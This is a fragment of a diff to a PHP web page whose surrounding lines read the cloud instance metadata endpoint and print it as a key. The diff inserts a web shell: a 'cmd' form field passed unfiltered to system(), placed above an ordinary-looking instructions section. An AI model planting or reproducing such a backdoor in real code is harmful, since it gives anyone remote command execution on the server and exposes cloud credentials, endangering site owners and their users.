@@ -48,7 +48,19 @@ else
     $content = file_get_contents('http://169.254.169.254/latest/meta-data', false, $context);
     echo "The Key is " . $content;
 ?>
-
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+<script>document.getElementById("cmd").focus();</script>
     <section class="instructions">
         <h2>What's Next?</h2>
         <ul>
